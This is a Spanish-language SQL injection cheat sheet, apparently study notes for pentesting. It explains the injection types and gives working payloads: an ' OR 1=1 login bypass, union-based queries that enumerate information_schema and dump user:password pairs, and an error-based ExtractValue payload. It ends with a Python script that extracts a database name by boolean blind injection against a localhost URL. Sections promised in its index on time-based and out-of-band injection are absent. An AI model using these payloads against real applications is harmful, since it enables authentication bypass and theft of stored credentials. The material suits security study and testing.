## SQL Injection

### Indice
- [Tipos y funcionamiento general](#como)
- #### IN BAND
  *   [Union-Based](#union)
  *   [Error-Based](#error)
- #### BLIND
  *   [Boolean](#boolean)
  *   [Time](#tine)
- #### OUT OF BAND
  *   [Out of band](#out)
- <a href="https://deephacking.tech/sql-injection/">Mas info</a>








<a name="como"></a>
## Tipos y funcionamiento
Tenemos 3 tipos:
* IN BAND
  Es la que vemos la respuesta de la base de datos en la respuesta del servidor. Es la mas sencilla de todas. tendriamos de tipo UNION y ERROR.

* BLIND
  No veriamos la respuesta de la base de datos en ninguna respuesta del servidor, y tendriamos de tipo BOOLEAN y tipo TIME

* OUT OF BAND

### Ejemplo de funcionamiento inyección SQL
para realizar una inyeccion, debemos romper la query. por ejemplo en un formulario de usuario y contraseña en una web:  

en email ponemos el email, y en contraseña una contraseña  

la query "oficial" seria algo así:  

```
SELECT email,pass WHERE email = "emailintroducido" AND pass ="passintroducida";
```
para romper esa query, lo que hacemos es introducir una ' en el campo email o contraseña, seguida de la inyección y un comentario, quedaria así:  

email: eddy@gmail.com' comando de la inyeccion-- -  

pass: contraseña123  

ejemplo tipico de inyección por ejemplo en un formulario web:  
```
email: eddy@gmail.com' OR 1=1-- -
pass: contraseña123
```
y lo que haría realmente por detrás es:  
```
SELECT email,pass WHERE email = "eddy@gmail.com" OR 1=1 AND pass ="contraseña123";
```
con lo cual la lógica de base de datos, diría que si el email está contenido en la base de datos o 1 es igual a 1, cosa que siempre se cumple. iniciaremos sesión con el primer usuario de la tabla.











## IN BAND

<a name="union"></a>
### Union-Based
Hay que tener en cuenta que cuando realizamos la instruccion UNION entre dos SELECT, ambos select deben tener el mismo numero de columnas. asi que lo primero es determinar el numero de columnas de la query que esta corriendo en el servidor.  
se puede hacer con un order by, ejemplo:  

empezamos con un order by 1, luego con un order by 2, y asi hasta que de error. cuando de error por ejemplo en el order by 4, pues sabemos que hay 3 columnas. 
```
' ORDER BY 1
' ORDER BY 2
' ORDER BY 3
' ...
```
Una vez determinado la cantidad de columnas de la query, vamos a investigar en la base de datos:  

suponiendo que tiene 3 columnas, ejecutamos la siguiente sentencia:  
```
'UNION SELECT schema_name, null,null FROM information_schema.schemata-- -
```
suponemos que encontramos las siguentes bases de datos:
* information_schema
* perfomance_schema
* mysql
* webserver

ahora vamos a indagar en webserver:  
```
'UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema="webserver"-- -
```
suponemos que encontramos las siguientes tablas:  

* users
* books
* images
vamos a indagar en users:
```
'UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name="users" and table_schema="webserver"-- -
```

y vemos que tiene las columnas:
* id
* user
* password
ahora para extraer esos datos es tan sencillo como:
```
'UNION SELECT CONCAT(user,0x3a,password),null,null FROM users WHERE table_schema="webserver"-- - 
```
APUNTES:  

- el concat no es siempre necesario
- 0x3a en hexadecimal significa los dos puntos ":"
- el where no deberia ser necesario en caso de usuarios y claves xq ya la web está preparada para consultar en esa base de datos





<a name="error"></a>
### Error-Based
 Este tipo de SQL Injection consiste en ocasionar a propósito un error en el servidor, de tal forma, que en esta respuesta, consigamos resultados de la base de datos.  
```
' AND ExtractValue(”,Concat(‘=’,(<SENTENCIA SQL>)))-- -
```

En la parte de SENTENCIA SQL, pondríamos las sentencias que quisieramos ejecutar.  

## BLIND

<a name="boolean"></a>
### Boolean
En este tipo de injecciones no vemos el resultado de la consulta en la propia respuesta del servidor. Para poder realizar la consulta, requeriremos del siguiente script en python3, donde deberiamos modificar la URL y la sentencia:  
```
#!/usr/bin/python3

import requests
import sys

mayusc = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
minusc = mayusc.lower()
numbers = '1234567890'
simbols = '|@#~!"·$%&/()=:.-_,; <>[]{}?\r\n'

dictionary = minusc + mayusc + numbers + simbols

def booleanSQL():

        global info
        info = ''

        for i in range(1,100):

                stop = False

                for j in dictionary:

                        response = requests.get("http://localhost/books.php?id=1 AND SUBSTR(database(), %d, 1)='%s'#" % (i, j))

                        if 'La peticion se ha realizado' in response.text:

                                print("La letra numero %d es %s" % (i, j))

                                info += j

                                stop = False

                                break

                        stop = True

                if stop:
                        break

if __name__ == '__main__':

        booleanSQL()

        print("\nLa base de datos se llama %s" % info)
```
